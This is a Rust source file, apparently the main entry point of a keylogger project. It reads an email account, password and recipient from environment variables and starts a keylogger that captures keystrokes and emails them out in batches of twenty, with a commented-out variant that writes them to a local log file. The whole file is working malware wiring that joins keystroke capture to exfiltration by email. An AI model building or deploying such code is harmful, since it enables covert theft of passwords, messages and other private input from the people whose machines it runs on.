/*
    To-Do
    -----
        - Test out parsin by using the parsing function multiple times
            to deal with subcommands
*/
mod keylogger;
mod method;
use keylogger::Keylogger;
use method::Method;
use rdev::{listen, Event};

use std::env;
use std::io::Result;
use std::process::exit;
use std::sync::LazyLock;

static EMAIL: LazyLock<String> = LazyLock::new(|| match env::var("EMAIL") {
    Ok(var) => var,
    Err(_) => {
        eprintln!("Environment variable \"EMAIL\" was not set.");
        exit(1)
    }
});

static PASSWORD: LazyLock<String> = LazyLock::new(|| match env::var("PASSWORD") {
    Ok(var) => var,
    Err(_) => {
        eprintln!("Environment variable \"PASSWORD\" was not set.");
        exit(1)
    }
});

static RECIPIENT: LazyLock<String> = LazyLock::new(|| match env::var("RECIPIENT") {
    Ok(var) => var,
    Err(_) => {
        eprintln!("Environment variable \"RECIPIENT\" was not set.");
        exit(1)
    }
});

fn main() {
    //let mut keylogger = Keylogger::new(Method::File {
    //    path: "./keylogger_log.txt".to_string(),
    //}).set_buffer_capacity(10);
    //keylogger.start();
    let email: String = EMAIL.to_string();
    let password: String = PASSWORD.to_string();
    let recipient: String = RECIPIENT.to_string();
    let mut keylogger = Keylogger::new(Method::Email {
        email,
        password,
        recipient
    }).set_buffer_capacity(20);
    keylogger.start();
}
